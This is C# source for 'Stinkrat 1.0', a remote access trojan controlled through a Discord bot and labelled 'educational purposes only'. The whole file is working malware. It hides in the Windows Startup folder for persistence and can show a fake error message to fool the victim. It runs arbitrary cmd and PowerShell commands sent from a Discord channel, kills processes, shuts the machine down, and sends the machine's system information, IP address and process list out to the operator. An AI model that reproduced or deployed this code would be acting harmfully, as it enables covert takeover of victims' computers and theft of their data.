// Educational purposes only ;)
// Stinkrat 1.0
using Discord;
using Discord.WebSocket;
using System.Diagnostics;
using System.Net;

/*
    Features
    - Open websites (!website <url>)
    - Get computer info (!info)/(!fullinfo)
    - Show message boxes (!message <message>)
    - Show open apps (!processes)
    - Kill tasks (!execute KILLTASK <task>)
    - Execute CMD Commands (!execute <command>) For powershell (!execute powershell <command>)
    - Get IP (!ip)
    - Shutdown machine (!shutdown)
    - Fake notification sound (!notification)
    - Spam terminal windows (!terminals)
    - Autostarts when they boot up too
*/

namespace App
{
    class RAT
    {
        public static void ShowMessage(string message)
        {
            MessageBox.Show(message, ":)", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        public static string SystemInfo()
        {
            var os = Environment.OSVersion;
            var machine = Environment.MachineName;
            var username = Environment.UserName;

            return $"-> OS: {os}\n-> Machine Name: {machine}\n-> Username: {username}";
        }

        public static void OpenURL(string url)
        {
            Process.Start("cmd.exe", "/C explorer " + url);
        }

        public static string LogTasks()
        {
            Process[] processes = Process.GetProcesses();
            string msg = "";
            List<string> sent = new List<string>();
            foreach (Process process in processes)
            {
                if (sent.Contains(process.ProcessName)) continue;
                sent.Add(process.ProcessName);
                msg += process.Id + " | " + process.ProcessName + "\n";
            }
            return msg;
        }

        public static void Execute(string command)
        {
            Process.Start("cmd.exe", "/C " + command);
        }

        public static void Shutdown()
        {
            Process.Start("cmd.exe", "/C shutdown /s");
        }

        public static string IP()
        {
            String address = "";
            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
            using (WebResponse response = request.GetResponse())
            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
            {
                address = stream.ReadToEnd();
            }

            int first = address.IndexOf("Address: ") + 9;
            int last = address.LastIndexOf("</body>");
            address = address.Substring(first, last - first);

            return $"IP: ```{address}```";
        }

        public static void StartUpPrograms()
        {
            // Remember to change this depending on the exe's name
            string path = $"{Directory.GetCurrentDirectory()}\\RAT.exe";
            string path2 = @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RAT.exe";
            try
            {
                if (!File.Exists(path)) using (FileStream fs = File.Create(path)) { };
                if (File.Exists(path2)) File.Delete(path2);
                File.Move(path, path2);
            }
            catch
            {
                // Pass
            }
        }

        public static void SpamTerminalWindows()
        {
            for (int i = 0; i < 10; i++) // open 10 command prompt windows
            {
                Process.Start("cmd.exe");
            }
        }

        public static string FullDeviceInfo()
        {
            var processInfo = new ProcessStartInfo("cmd.exe", "/c systeminfo")
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardError = true,
                RedirectStandardOutput = true,
                WorkingDirectory = @"C:\Windows\System32\"
            };

            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            Process? p = Process.Start(processInfo);
            p.OutputDataReceived += (sender, args) => sb.AppendLine(args.Data);
            p.BeginOutputReadLine();
            p.WaitForExit();
            return sb.ToString();
        }
    }

    class Program
    {
        private readonly DiscordSocketClient _client;

        // Where log messages will be sent
        // replace these with the guild and channel id of where you want to control the bot
        ulong log_guild = 1012757688389734510;
        ulong log_channel = 1013091266973671557;
        string TOKEN = "your bot token here"; // Keep this a secret

        // A fake error message will show when you run the program.
        //string message_content = "Graphics ERR in [UnityMain.dll] (0x0065e)";
        //string message_title = "UnityEngine Graphics Error";

        static void Main(string[] args)
             => new Program()
                .MainAsync()
                .GetAwaiter()
                .GetResult();

        public Program()
        {
            // show fake error
            // MessageBox.Show(message_content, message_title); // uncomment this if you want
            RAT.StartUpPrograms(); // put itself into the startup folder
            _client = new DiscordSocketClient();
            _client.MessageReceived += MessageReceivedAsync;
            _client.Ready += ClientReady;
        }

        public async Task MainAsync()
        {
            await _client.LoginAsync(TokenType.Bot, TOKEN);
            await _client.StartAsync();
            await Task.Delay(Timeout.Infinite);
        }

        private async Task ClientReady()
        {
            await _client.GetGuild(log_guild).GetTextChannel(log_channel).SendMessageAsync("@everyone Connected to **`" + Environment.MachineName + "`** at **" + DateTime.Now.ToString("HH:mm:ss") + "**");
        }

        private async Task MessageReceivedAsync(SocketMessage message)
        {
            try
            {
                // should replace this with a switch statement soon
                if (message.Content == "!info")
                {
                    await message.Channel.SendMessageAsync($"**```{RAT.SystemInfo()}```**");
                }

                if (message.Content.StartsWith("!message"))
                {
                    RAT.ShowMessage(message.Content.Trim().Replace("!message", ""));
                }

                if (message.Content.StartsWith("!website"))
                {
                    RAT.OpenURL(message.Content.Trim().Replace("!website", ""));
                }

                if (message.Content == "!processes")
                {
                    await message.Channel.SendMessageAsync($"**TASKS**\n**```{RAT.LogTasks()}```**");
                }

                if (message.Content.StartsWith("!execute"))
                {
                    RAT.Execute(message.Content.Trim().Replace("!execute", ""));
                }

                if (message.Content == "!ip")
                {
                    await message.Channel.SendMessageAsync(RAT.IP());
                }

                if (message.Content == "!shutdown")
                {
                    RAT.Shutdown();
                }

                if (message.Content == "!notification")
                {
                    System.Media.SystemSounds.Exclamation.Play();
                }

                if (message.Content == "!terminals")
                {
                    RAT.SpamTerminalWindows();
                }

                if (message.Content == "!fullinfo")
                {
                    string str = RAT.FullDeviceInfo();
                    int chunkSize = 1990;
                    int stringLength = str.Length;
                    for (int i = 0; i < stringLength; i += chunkSize)
                    {
                        if (i + chunkSize > stringLength) chunkSize = stringLength - i;
                        await message.Channel.SendMessageAsync($"```{str.Substring(i, chunkSize)}```");
                    }
                }
            }
            catch (Exception e)
            {
                await message.Channel.SendMessageAsync($"**An error was encountered, feel free to report this on github**\n{e}");
            }
        }
    }
}
